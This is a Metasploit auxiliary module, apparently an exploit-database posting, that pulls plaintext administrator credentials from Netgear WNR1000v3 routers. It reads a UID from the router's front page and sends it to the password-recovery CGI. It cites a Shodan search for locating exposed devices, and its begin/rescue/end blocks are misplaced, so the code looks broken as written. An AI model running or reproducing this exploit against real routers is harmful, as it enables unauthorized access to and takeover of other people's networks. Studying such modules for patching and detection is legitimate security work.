# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Exploit Title: Netgear WNR1000v3 Password Recovery Credential Disclosure Vulnerability
# Date: 7-5-14
# Exploit Author: c1ph04
# Vendor Homepage: http://www.netgear.com/
# Version: 1.0
# Tested on: Netgear WNR1000v3 Router Version: <= 1.0.2.62_60.0.87
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize
    super(
 
      &#039;Name&#039;        => &#039;Netgear WNR1000v3 Password Extractor&#039;,
 
      &#039;Description&#039; => %q{
          This module exploits a vulnerability in the password recovery feature of certain Netgear WNR1000v3 routers.
          Affected devices will allow retrieval of the plaintext administrator credentials.
          Vulnerable Versions: <= 1.0.2.62_60.0.87
       },
 
      &#039;References&#039;  =>
        [
          [ &#039;URL&#039;, &#039;http://c1ph04text.blogspot.com/2014/01/mitrm-attacks-your-middle-or-mine.html&#039; ],
          [ &#039;URL&#039;, &#039;http://packetstormsecurity.com/files/124759/NETGEAR-WNR1000v3-Password-Disclosure.html&#039; ],
          [ &#039;URL&#039;, &#039;http://secunia.com/community/advisories/56330&#039; ],
          [ &#039;URL&#039;, &#039;http://www.shodanhq.com/search?q=WNR1000v3&#039; ]
        ],
 
      &#039;Author&#039;      =>
        [
          &#039;c1ph04 <c1ph04mail[at]gmail.com>&#039; # aka - "Ms. Difrank"...idiots
        ],
      &#039;License&#039;     => MSF_LICENSE
    )
  end
 
  def run
 
    print_status("#{rhost}:#{rport} - Attempting to extract credentials...")
 
    begin
 
      res = send_request_raw({
        &#039;uri&#039; => &#039;/&#039;,
        &#039;method&#039; => &#039;GET&#039;
        })
 
      if (res.body =~ /(id)/)
        uid = res.body.scan(/\d{5,15}/)
        uid = uid[0]
        print_good("#{rhost}:#{rport} - UID Retrieved: #{uid}")
        print_good("#{rhost}:#{rport} - Sending Request...")
 
      else
        print_error("Unexpected response...is this a Netgear Router?")
        return
 
      end
 
      res2 = send_request_raw({
        &#039;uri&#039; => "/passwordrecovered.cgi?id=#{uid}",
        &#039;method&#039; => &#039;POST&#039;
        })
 
        if (res2.body =~ /(successfully)/)
          creds = res2.body.scan(/left">(.*)</)
          user = creds[0]
          pass = creds[1]
          print_good("#{rhost}:#{rport} - Username: #{user}")
          print_good("#{rhost}:#{rport} - Password: #{pass}")
 
        else
          print_error("#{rhost}:#{rport} - Failed: Target Not Vulnerable")
 
        end
       end
      end
 
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
 
    end

